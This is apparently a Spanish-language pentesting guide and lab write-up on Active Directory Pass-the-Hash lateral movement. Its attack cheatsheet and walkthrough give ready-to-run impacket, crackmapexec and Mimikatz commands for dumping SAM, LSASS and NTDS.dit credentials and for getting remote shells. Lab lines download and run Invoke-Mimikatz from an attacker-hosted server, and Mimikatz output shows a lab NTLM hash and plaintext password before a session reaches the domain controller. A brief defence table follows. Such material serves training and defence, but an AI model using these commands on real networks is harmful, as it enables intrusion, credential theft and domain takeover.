
# AD Lateral Movement: Pass-the-Hash

## <mark style="color:$primary;">¿Qué es Pass-the-Hash?</mark>

**Pass-the-Hash (PtH)** es una técnica de movimiento lateral que permite a un atacante autenticarse en sistemas remotos utilizando **únicamente el hash NTLM** de un usuario, sin necesidad de conocer su contraseña en texto claro.

#### ¿Cómo funciona?

Cuando un usuario se autentica en un sistema Windows mediante NTLM, el sistema envía el hash de la contraseña, no la contraseña misma. Si obtienes ese hash (por ejemplo, desde la SAM, LSASS o NTDS.dit), puedes "pasarlo" a otra máquina y autenticarte como si tuvieras la contraseña.

#### Requisitos para el ataque

<table data-header-hidden><thead><tr><th width="166"></th><th></th></tr></thead><tbody><tr><td>Requisito</td><td>Descripción</td></tr><tr><td><strong>Hash NTLM</strong></td><td>Obtener el hash del usuario objetivo (LM:NT o solo NT)</td></tr><tr><td><strong>Acceso a red</strong></td><td>Conectividad con el equipo remoto (puerto 445 SMB principalmente)</td></tr><tr><td><strong>Privilegios</strong></td><td>El usuario debe tener privilegios de administrador en el equipo remoto</td></tr></tbody></table>

#### Escenario típico de ataque

1. **Comprometer un equipo** y obtener privilegios SYSTEM
2. **Dumpear hashes** de la SAM o LSASS
3. **Probar el hash** en otros equipos con `crackmapexec`
4. **Ejecutar comandos/obtener shell** usando herramientas como `psexec.py` o `wmiexec.py`
5. **Repetir** para moverse lateralmente hasta alcanzar el Domain Controller

***

## <mark style="color:$primary;">Cheatsheet</mark>

### 🔍 Enumeración y prueba de hashes

<table data-header-hidden><thead><tr><th width="297.33331298828125"></th><th></th></tr></thead><tbody><tr><td>Herramienta</td><td>Comando</td></tr><tr><td><strong>crackmapexec</strong> (probar hash en un equipo)</td><td><code>crackmapexec smb 192.168.1.10 -u administrator -H &#x3C;hash> --local-auth</code></td></tr><tr><td><strong>crackmapexec</strong> (probar en múltiples equipos)</td><td><code>crackmapexec smb 192.168.1.10-20 -u administrator -H &#x3C;hash> --local-auth</code></td></tr><tr><td><strong>crackmapexec</strong> (con dominio)</td><td><code>crackmapexec smb 192.168.1.10 -d dominio.local -u usuario -H &#x3C;hash></code></td></tr><tr><td><strong>netexec (nxc)</strong></td><td><code>nxc smb 192.168.1.10 -u administrator -H &#x3C;hash> --local-auth</code></td></tr></tbody></table>

### 🖥️ Obtención de shell desde Kali Linux (impacket)

<table data-header-hidden><thead><tr><th width="229.6666259765625"></th><th width="402.333251953125"></th><th></th></tr></thead><tbody><tr><td>Herramienta</td><td>Comando</td><td>Puerto</td></tr><tr><td><p><strong>impacket-psexec</strong> </p><p>(shell interactiva)</p></td><td><code>impacket-psexec -hashes :&#x3C;hash> administrador@192.168.1.10</code></td><td>445</td></tr><tr><td><p><strong>impacket-psexec</strong> </p><p>(con dominio)</p></td><td><code>impacket-psexec -hashes :&#x3C;hash> dominio.local/usuario@192.168.1.10</code></td><td>445</td></tr><tr><td><p><strong>impacket-psexec</strong> </p><p>(usuario con espacio)</p></td><td><code>impacket-psexec -hashes :&#x3C;hash> 'dominio.local\nombre usuario'@192.168.1.10</code></td><td>445</td></tr><tr><td><strong>impacket-wmiexec</strong> (semi-interactivo, más sigiloso)</td><td><code>impacket-wmiexec -hashes :&#x3C;hash> administrador@192.168.1.10</code></td><td>135, 445</td></tr><tr><td><strong>impacket-smbexec</strong> (shell limitada, más sigilosa)</td><td><code>impacket-smbexec -hashes :&#x3C;hash> administrador@192.168.1.10</code></td><td>445</td></tr><tr><td><strong>impacket-atexec</strong> (ejecutar comando programado)</td><td><code>impacket-atexec -hashes :&#x3C;hash> administrador@192.168.1.10 "whoami"</code></td><td>445</td></tr><tr><td><p><strong>impacket-dcomexec</strong> </p><p>(vía DCOM)</p></td><td><code>impacket-dcomexec -hashes :&#x3C;hash> administrador@192.168.1.10</code></td><td>135</td></tr></tbody></table>

### 🪟 Obtención de shell desde Windows

<table data-header-hidden><thead><tr><th width="228.66668701171875"></th><th></th></tr></thead><tbody><tr><td>Herramienta</td><td>Comando</td></tr><tr><td><strong>Mimikatz</strong> (inyectar hash en sesión actual)</td><td><code>sekurlsa::pth /user:administrador /domain:dominio.local /ntlm:&#x3C;hash></code></td></tr><tr><td><strong>Rubeus</strong> (Overpass-the-Hash)</td><td><code>Rubeus.exe asktgt /user:administrador /domain:dominio.local /rc4:&#x3C;hash> /ptt</code></td></tr></tbody></table>

### 📤 Obtención de hashes (para usar en PtH)

<table data-header-hidden><thead><tr><th width="230"></th><th></th></tr></thead><tbody><tr><td>Técnica</td><td>Herramienta/Comando</td></tr><tr><td><strong>Dumpear SAM local</strong></td><td><code>reg save hklm\sam sam.save</code> + <code>impacket-secretsdump -sam sam.save -system system.save LOCAL</code></td></tr><tr><td><strong>Dumpear LSASS</strong></td><td><code>procdump.exe -ma lsass.exe lsass.dmp</code> + <code>impacket-secretsdump lsass.dmp LOCAL</code></td></tr><tr><td><strong>Desde DC (NTDS.dit)</strong></td><td><code>impacket-secretsdump -just-dc dominio.local/administrador@192.168.1.10</code></td></tr><tr><td><strong>Mimikatz (en Windows)</strong></td><td><code>privilege::debug</code> + <code>sekurlsa::logonpasswords</code></td></tr></tbody></table>

***

## <mark style="color:$primary;">Ejemplos prácticos</mark>

#### 1. Probar si un hash funciona (crackmapexec)

```bash
crackmapexec smb 192.168.1.50 -u administrador -H aad3b435b51404eeaad3b435b51404ee:3c8cbfa6a2c6f0a5f9e2d8c4a1b7e5f3 --local-auth
```

> El hash `aad3b435b51404eeaad3b435b51404ee` es LM vacío (si no se usa LM). El formato completo es `LM:NT`

#### 2. Obtener shell con impacket-psexec

```bash
# Formato más común (solo NT hash)
impacket-psexec -hashes :3c8cbfa6a2c6f0a5f9e2d8c4a1b7e5f3 administrador@192.168.1.50

# Con dominio
impacket-psexec -hashes :3c8cbfa6a2c6f0a5f9e2d8c4a1b7e5f3 dominio.local/administrador@192.168.1.50

# Con LM:NT (poco común hoy)
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:3c8cbfa6a2c6f0a5f9e2d8c4a1b7e5f3 administrador@192.168.1.50

# Con Metasploit
msfconsole
search psexec
# En la contraseña poner el hash
```

#### 3. Ejecutar un solo comando sin shell interactiva

```bash
impacket-psexec -hashes :3c8cbfa6a2c6f0a5f9e2d8c4a1b7e5f3 administrador@192.168.1.50 "whoami && hostname"
```

#### 4. Obtener shell con impacket-wmiexec (más sigiloso)

```bash
impacket-wmiexec -hashes :3c8cbfa6a2c6f0a5f9e2d8c4a1b7e5f3 administrador@192.168.1.50
```

#### 5. Obtener hashes desde un DC (posible fuente para PtH)

```bash
impacket-secretsdump -just-dc dominio.local/administrador:password@192.168.1.10
```

***

## <mark style="color:$primary;">Flujo completo de ataque</mark>

#### Paso 1: Comprometer un equipo inicial y obtener hashes

```bash
# En Windows (con Mimikatz)
privilege::debug
sekurlsa::logonpasswords
```

```bash
# En Kali (si tienes acceso al equipo)
impacket-secretsdump -sam sam.save -system system.save LOCAL
```

#### Paso 2: Probar los hashes en otros equipos

```bash
# Descubrir equipos en la red
crackmapexec smb 192.168.1.0/24 -u administrador -H <hash> --local-auth

# Probar un equipo específico
crackmapexec smb 192.168.1.50 -u administrador -H <hash> --local-auth
```

#### Paso 3: Moverse lateralmente

```bash
# Si el hash funciona, obtener shell
impacket-psexec -hashes :<hash> administrador@192.168.1.50

# Y desde ahí, dumpear más hashes para seguir moviéndose
# (ejecutar dentro de la shell)
reg save hklm\sam sam.save
reg save hklm\system system.save
# Descomprimir los archivos y analizarlos localmente
```

#### Paso 4: Escalar hasta el Domain Controller

```bash
# Una vez en una máquina con privilegios de dominio
impacket-secretsdump -just-dc dominio.local/usuario@192.168.1.10 -hashes :<hash>
```

***

#### 🎯 Diferencia entre PtH con y sin dominio

<table data-header-hidden><thead><tr><th width="310.6666259765625"></th><th></th></tr></thead><tbody><tr><td>Escenario</td><td>Comando impacket-psexec</td></tr><tr><td><strong>Equipo sin dominio (workgroup)</strong></td><td><code>impacket-psexec -hashes :&#x3C;hash> administrador@192.168.1.50</code></td></tr><tr><td><strong>Equipo en dominio</strong></td><td><code>impacket-psexec -hashes :&#x3C;hash> dominio.local/administrador@192.168.1.50</code></td></tr><tr><td><strong>Usuario local (no dominio)</strong></td><td><code>impacket-psexec -hashes :&#x3C;hash> administrador@192.168.1.50</code> (sin dominio)</td></tr><tr><td><strong>Usuario específico del dominio</strong></td><td><code>impacket-psexec -hashes :&#x3C;hash> 'dominio.local\usuario'@192.168.1.50</code></td></tr></tbody></table>

***

#### ⚠️ Limitaciones importantes

<table data-header-hidden><thead><tr><th width="314.6666259765625"></th><th></th></tr></thead><tbody><tr><td>Limitación</td><td>Explicación</td></tr><tr><td><strong>Solo funciona con NTLM</strong></td><td>No funciona en entornos solo Kerberos</td></tr><tr><td><strong>Requiere puerto 445 abierto</strong></td><td>El SMB debe estar accesible</td></tr><tr><td><strong>El usuario debe ser admin local</strong></td><td>Necesita privilegios administrativos en el remoto</td></tr><tr><td><strong>Puede generar logs</strong></td><td>Evento 4624 (inicio de sesión con NTLM)</td></tr><tr><td><strong>Algunas herramientas antivirus lo detectan</strong></td><td>psexec en particular es muy conocido</td></tr></tbody></table>

***

## <mark style="color:$primary;">¿Cómo protegerte de Pass-the-Hash?</mark>

<table data-header-hidden><thead><tr><th width="318.66668701171875"></th><th></th></tr></thead><tbody><tr><td>Medida</td><td>Descripción</td></tr><tr><td><strong>Restringir administradores locales</strong></td><td>Usar LAPS para contraseñas únicas por equipo</td></tr><tr><td><strong>Proteger procesos con privilegios</strong></td><td>Activar Protected Process Light (PPL)</td></tr><tr><td><strong>Usar credenciales basadas en Kerberos</strong></td><td>Deshabilitar NTLM donde sea posible</td></tr><tr><td><strong>Restringir cuentas con privilegios</strong></td><td>Usar cuentas tipo "Managed Service Accounts"</td></tr><tr><td><strong>Monitorear eventos</strong></td><td>Evento 4624 con Type 3 y 4625</td></tr><tr><td><strong>Usar Windows Defender Credential Guard</strong></td><td>Protege hashes en LSASS</td></tr></tbody></table>

***

### 📌 Notas importantes

1. El formato del hash en `-hashes` es `LMhash:NThash`. Hoy en día casi siempre es `:<NThash>` (LM vacío)
2. `impacket-psexec` crea un servicio temporal; puede ser detectado por EDR/AV
3. `impacket-wmiexec` es más sigiloso pero menos estable
4. Si tienes el hash NT, tienes la contraseña (desde el punto de vista de autenticación)
5. El ataque funciona aunque la contraseña sea de 256 caracteres

***

## <mark style="color:$primary;">Lab:</mark> <mark style="color:$primary;"></mark><mark style="color:$primary;">**Pass-the-Hash (PtH) Attacks**</mark>

En este entorno de laboratorio, tendrás acceso a la interfaz gráfica de usuario (GUI) de una máquina Windows (2012). Esta máquina actuará como tu máquina atacante. Tu tarea en este laboratorio es realizar un ataque Pass-the-Hash para obtener acceso al controlador de dominio.

**Objetivo: Realizar un ataque Pass-the-Hash para obtener acceso al controlador de dominio.**

**Nota:** Todas las herramientas se encuentran en el directorio **C:\Tools** .

Las mejores herramientas para este laboratorio son:

* PowerView
* Invoke-TokenManipulation.ps1
* Invoke-Mimikatz.ps1

### Enumeración con Powerview

```powershell
PS C:\Users\student> cd c:/tools
PS C:\tools> powershell -ep bypass

PS C:\tools> Import-Module .\PowerView.ps1
PS C:\tools> Get-Domain

Forest                  : SECURITY.local
DomainControllers       : {prod.research.SECURITY.local}
Children                : {}
DomainMode              : Windows2012R2Domain
DomainModeLevel         : 6
Parent                  : SECURITY.local
PdcRoleOwner            : prod.research.SECURITY.local
RidRoleOwner            : prod.research.SECURITY.local
InfrastructureRoleOwner : prod.research.SECURITY.local
Name                    : research.SECURITY.local
```

Encontramos:

* Nombre del dominio:  `research.SECURITY.local`
* Nombre del DC:  `prod.research.SECURITY.local`

### Encontrar administradores locales

```powershell
PS C:\tools> Find-LocalAdminAccess
seclogs.research.SECURITY.local
```

Encontramos el admin local `seclogs.research.SECURITY.local` con el que nos impersonaremos desde Powershell:

```powershell
PS C:\tools> Enter-PSSession seclogs.research.SECURITY.local
[seclogs.research.SECURITY.local]: PS C:\Users\student\Documents>
```

### Privilegios

Observamos que tenemos todos los privilegios de este usuario:

```powershell
[seclogs.research.SECURITY.local]: PS C:\Users\student\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                  Description                               State
=============================== ========================================= =======
SeIncreaseQuotaPrivilege        Adjust memory quotas for a process        Enabled
SeSecurityPrivilege             Manage auditing and security log          Enabled
SeTakeOwnershipPrivilege        Take ownership of files or other objects  Enabled
SeLoadDriverPrivilege           Load and unload device drivers            Enabled
SeSystemProfilePrivilege        Profile system performance                Enabled
SeSystemtimePrivilege           Change the system time                    Enabled
SeProfileSingleProcessPrivilege Profile single process                    Enabled
SeIncreaseBasePriorityPrivilege Increase scheduling priority              Enabled
SeCreatePagefilePrivilege       Create a pagefile                         Enabled
SeBackupPrivilege               Back up files and directories             Enabled
SeRestorePrivilege              Restore files and directories             Enabled
SeShutdownPrivilege             Shut down the system                      Enabled
SeDebugPrivilege                Debug programs                            Enabled
SeSystemEnvironmentPrivilege    Modify firmware environment values        Enabled
SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled
SeRemoteShutdownPrivilege       Force shutdown from a remote system       Enabled
SeUndockPrivilege               Remove computer from docking station      Enabled
SeManageVolumePrivilege         Perform volume maintenance tasks          Enabled
SeImpersonatePrivilege          Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege         Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege   Increase a process working set            Enabled
SeTimeZonePrivilege             Change the time zone                      Enabled
SeCreateSymbolicLinkPrivilege   Create symbolic links                     Enabled
```

### HFS File Server

En la ruta `C:\Tools` encontramos la herramienta HFS:

<figure><img src="/files/VjMfCf6GrMBCP6bJpxsr" alt=""><figcaption></figcaption></figure>

La ejecutamos y vamos a Menu > Add files, y seleccionamos tanto `InvokeMimikatz` como `Invoke-TokenManipulation`

<figure><img src="/files/I1SvQ5gc6RmBClb7DFVB" alt=""><figcaption></figcaption></figure>

Esto nos sirve para importar las herramientas a la sesión de Powershell del seclogs que hemos impersonado, ya que nos genera una URL para descargar las tools:

<figure><img src="/files/zS1HirT4AAvu9y1hlpaO" alt=""><figcaption></figcaption></figure>

### Importar tools y ejecutar Token Manipulation

```powershell
[seclogs.research.SECURITY.local]: PS C:\> iex (New-Object Net.WebClient).DownloadString('http://10.0.5.101/Invoke-TokenManipulation.ps1')
[seclogs.research.SECURITY.local]: PS C:\> Invoke-TokenManipulation -Enumerate

Domain              : RESEARCH
Username            : Administrator
hToken              : 5920
LogonType           : 2
IsElevated          : True
TokenType           : Primary
SessionID           : 1
PrivilegesEnabled   : {SeChangeNotifyPrivilege, SeImpersonatePrivilege, SeCreateGlobalPrivilege}
PrivilegesAvailable : {SeIncreaseQuotaPrivilege, SeSecurityPrivilege, SeTakeOwnershipPrivilege,
                      SeLoadDriverPrivilege...}
ProcessId           : 1660

Domain              : NT AUTHORITY
Username            : SYSTEM
hToken              : 3900
LogonType           : 0
IsElevated          : True
TokenType           : Primary
SessionID           : 0
PrivilegesEnabled   : {SeCreateTokenPrivilege, SeLockMemoryPrivilege, SeTcbPrivilege, SeSystemProfilePrivilege...}
PrivilegesAvailable : {SeAssignPrimaryTokenPrivilege, SeIncreaseQuotaPrivilege, SeSecurityPrivilege,
                      SeTakeOwnershipPrivilege...}
ProcessId           : 504

Domain              : NT AUTHORITY
Username            : NETWORK SERVICE
hToken              : 3620
LogonType           : 5
IsElevated          : True
TokenType           : Primary
SessionID           : 0
PrivilegesEnabled   : {SeChangeNotifyPrivilege, SeImpersonatePrivilege, SeCreateGlobalPrivilege}
PrivilegesAvailable : {SeAssignPrimaryTokenPrivilege, SeIncreaseQuotaPrivilege, SeAuditPrivilege,
                      SeIncreaseWorkingSetPrivilege}
ProcessId           : 2052
```

Observamos que el LogonType del usuario administrator es `2`, lo que nos indica que está loguado:

```powershell
Domain              : RESEARCH
Username            : Administrator
hToken              : 5920
LogonType           : 2
```

### Invoke Mimikatz

```powershell
[seclogs.research.SECURITY.local]: PS C:\> iex (New-Object Net.WebClient).DownloadString('http://10.0.5.101/Invoke-Mimikatz.ps1')
[seclogs.research.SECURITY.local]: PS C:\> Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords"'

Hostname: seclogs.research.SECURITY.local / S-1-5-21-1693200156-3137632808-1858025440

  .#####.   mimikatz 2.2.0 (x64) #19041 Jun  9 2021 18:55:28
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(powershell) # privilege::debug
Privilege '20' OK

mimikatz(powershell) # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

400     {0;000003e7} 0 D 21883          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,20p)       Primary
 -> Impersonated !
 * Process Token : {0;0004da6c} 0 D 372119      RESEARCH\student        S-1-5-21-1693200156-3137632808-1858025440-1115
(09g,23p)       Primary
 * Thread Token  : {0;000003e7} 0 D 3138265     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,20p)   Impersonation (Deleg
ation)

mimikatz(powershell) # sekurlsa::logonpasswords

Authentication Id : 0 ; 235612 (00000000:0003985c)
Session           : Interactive from 1
User Name         : Administrator
Domain            : RESEARCH
Logon Server      : PROD
Logon Time        : 4/27/2026 6:36:43 PM
SID               : S-1-5-21-1693200156-3137632808-1858025440-500
        msv :
         [00010000] CredentialKeys
         * NTLM     : 84398159ce4d01cfe10cf34d5dae3909
         * SHA1     : ccc47c4f9541f99b020d38b8f7ea10f7b4b8595c
         [00000003] Primary
         * Username : Administrator
         * Domain   : RESEARCH
         * NTLM     : 84398159ce4d01cfe10cf34d5dae3909
         * SHA1     : ccc47c4f9541f99b020d38b8f7ea10f7b4b8595c
        tspkg :
        wdigest :
         * Username : Administrator
         * Domain   : RESEARCH
         * Password : (null)
        kerberos :
         * Username : Administrator
         * Domain   : RESEARCH.SECURITY.LOCAL
         * Password : Hello_World123
<----SNIP---->
```

Obtenemos tanto la contraseña en plano del usuario Administrator cómo su hash NTLM! Para esta sección nos centraremos en Pass the Hash.

### Pass the Hash

Abrimos una nueva Powershell como administrador:

```ps
PS C:\Tools> powershell -ep bypass
PS C:\Tools> . .\Invoke-Mimikatz.ps1
PS C:\Tools> Invoke-Mimikatz -Command '"sekurlsa::pth /user:administrator /domain:research.security.local /ntlm:84398159ce4d01cfe10cf34d5dae3909 /run:powershell.exe"'
```

Eso nos abre una nueva powershell como Administrator:

<figure><img src="/files/ilEaEQD3Xq4amm6GWWeR" alt=""><figcaption></figcaption></figure>

### Acceso al Domain Controller

Dentro de esta Powershell como Administrator podemos acceder directamente al Domain Controller usando `Enter-PSSession`:

```powershell
PS C:\Windows\system32> Enter-PSSession prod.RESEARCH.security.local
[prod.RESEARCH.security.local]: PS C:\Users\Administrator\Documents> cd /
[prod.RESEARCH.security.local]: PS C:\> ipconfig

Windows IP Configuration

Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . : research.security.local
   Link-local IPv6 Address . . . . . : fe80::fd74:149b:853d:346%13
   IPv4 Address. . . . . . . . . . . : 10.0.0.165
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.0.0.1

Tunnel adapter isatap.research.security.local:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : research.security.local
[prod.RESEARCH.security.local]: PS C:\> hostname
prod
```
